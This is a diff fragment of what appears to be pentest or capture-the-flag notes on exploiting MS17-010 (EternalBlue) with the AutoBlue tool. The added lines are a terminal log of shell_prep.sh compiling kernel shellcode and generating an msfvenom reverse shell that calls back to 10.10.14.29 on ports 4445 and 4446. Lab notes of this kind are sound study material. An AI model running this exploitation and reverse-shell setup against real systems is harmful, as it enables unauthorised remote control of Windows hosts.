@@ -163,6 +163,30 @@ payload => windows/x64/shell/reverse_tcp
 
 Goo -> autoblue Github
 https://github.com/3ndG4me/AutoBlue-MS17-010
+
+─# ./shell_prep.sh   
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+Y
+LHOST for reverse connection:
+10.10.14.29
+LPORT you want x64 to listen on:
+4445
+LPORT you want x86 to listen on:
+4446
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+1
+
 4445
 4446
 0
